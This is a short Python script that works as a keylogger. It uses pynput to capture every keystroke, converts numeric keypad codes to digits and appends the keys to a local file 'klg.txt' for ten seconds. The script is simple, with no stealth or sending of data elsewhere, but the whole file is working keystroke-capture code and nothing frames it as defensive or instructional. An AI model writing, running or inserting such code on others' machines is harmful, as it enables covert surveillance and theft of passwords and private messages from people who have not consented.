from pynput.keyboard import Listener
from datetime import datetime, timedelta


special = {
    "<96>": 0,
    "<97>": 1,
    "<98>": 2,
    "<99>": 3,
    "<100>": 4,
    "<101>": 5,
    "<102>": 6,
    "<103>": 7,
    "<104>": 8,
    "<105>": 9
}


def on_press(key):
    listen = str(key).replace("'", '').replace('Key.', '')  # output keycode conver to str
    if listen in special:
        s = listen.replace(listen, str(special[listen]))
        with open('klg.txt', 'a') as f:
            f.write(s)
    else:
        with open('klg.txt', 'a') as f:
            f.write(listen)

start = datetime.now()
end = start + timedelta(seconds=10)

def on_release(key):
    if datetime.now() >= end:
        return False

# def on_release(key):
#     if str(key).replace("'", '').replace('Key.', '') == 'esc':
#         return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()